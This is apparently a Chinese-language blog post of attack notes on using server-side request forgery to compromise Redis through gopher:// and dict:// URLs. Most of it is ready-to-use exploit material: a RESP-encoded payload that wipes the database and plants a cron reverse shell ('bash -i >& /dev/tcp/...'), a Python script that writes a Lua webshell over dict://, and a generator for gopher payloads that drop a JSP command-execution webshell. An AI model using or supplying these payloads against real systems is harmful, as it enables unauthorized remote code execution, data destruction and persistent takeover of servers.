---
title: ssrf打redis
date: 2025-01-09 02:06:46
tags: ["2025"]
categories: ["Summary"]
---

# SSRF打redis

```
思路：常见方法使用gopher和dict，执行redis命令，然后通过redis命令达到目的。
```

## 前置知识

RESP 协议

RESP 协议是 redis 服务之间数据传输的通信协议，redis 客户端和 redis 服务端之间通信会采取 RESP 协议
因此我们后续构造 payload 时也需要转换成 RESP 协议的格式

```
*1
$8
flushall
*3
$3
set
$1
1
$64



*/1 * * * * bash -i >& /dev/tcp/xxxxxxx/xxx 0>&1







*4
$6
config
$3
set
$3
dir
$16
/var/spool/cron/
*4
$6
config
$3
set
$10
dbfilename
$4
root
*1
$4
save
quit
```



## 1.写shell

直接通过redis执行命令写文件。

```
    commands = [
        "flushall",   #清空redis
        f'set:webshell:"{shellcode}"',   #写入shell内容
        'set:dir:/scripts',   #写入目录
        'set:dbfilename:visit.script',   #设置镜像文件名
        "save"  #保存写入
    ]
```

一般为：`dict://<host>:<port>/info` 探测端口应用信息
执行命令：`dict://<host>:<port>/命令:参数` 冒号相当于空格

通过dict写入的exp：

```
import requests
import urllib.parse

TARGET = "http://xx.xx"

def send_redis_command(command):
    """发送Redis命令"""
    url = f"dict://127.0.0.1:6379/{command}"
    params = {"url": url}
    r = requests.get(TARGET, params=params)
    print(f"[+] 命令 {command} 执行结果:")
    print(r.text)

def write_webshell():
    """写入Lua Webshell"""
    raw_code = '''shell_code'''
    
    # 转hex编码
    hex_code = ''.join('\\x{:02x}'.format(x) for x in raw_code.encode())
    shellcode = f"'{hex_code}'"
    commands = [
        "flushall",
        f'set:webshell:"{shellcode}"',
        'set:dir:/scripts',
        'set:dbfilename:visit.script',
        "save"
    ]

    for cmd in commands:
        send_redis_command(cmd)

def main():
    print("[*] 开始写入Webshell...")
    write_webshell()

if __name__ == "__main__":
    main()
```

使用gopher直接使用redis-over-gopher将payload编码即可

`gopher://<host>:<port>/<gopher-path>`

脚本(jsp示例)：

```
import urllib.parse
import base64

protocol="gopher://"
ip="123123132"
port="6379"
shell = "\n\n<% Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>\n\n"
filename="shell.jsp"
path="/opt/jetty/webapps/ROOT/"
passwd="xxxx"        #如果无密码就不加，如果有密码就加 
cmd=["flushall",
     "set 1 {}".format(shell.replace(" ","${IFS}")),
     "config set dir {}".format(path),
     "config set dbfilename {}".format(filename),
     "save"
     ]
if passwd:
    cmd.insert(0,"AUTH {}".format(passwd))
payload=protocol+ip+":"+port+"/_"
def redis_format(arr):
    CRLF="\r\n"
    redis_arr = arr.split(" ")
    cmd=""
    cmd+="*"+str(len(redis_arr))
    for x in redis_arr:
        cmd+=CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ")
    cmd+=CRLF
    return cmd

if __name__=="__main__":
    tmp = ''
    for x in cmd:
        tmp += urllib.parse.quote(redis_format(x))
    tmp = urllib.parse.quote(tmp)
    payload += urllib.parse.quote(tmp)
    print(payload)

```

## 2.写定时任务

一般在centos当中可以通过写定时任务的方式来执行系统命令（Ubuntu貌似存在问题，但是可以进行尝试

本质上也是写文件。

```
    commands = [
        "flushall",   #清空redis
        f'set:webshell:"{lua_code}"',   #写入shell内容
        'set:dir:/scripts',   #写入目录
        'set:dbfilename:visit.script',   #设置镜像文件名
        "save"  #保存写入
    ]
```

## 3.注意redis版本，存在的CVE
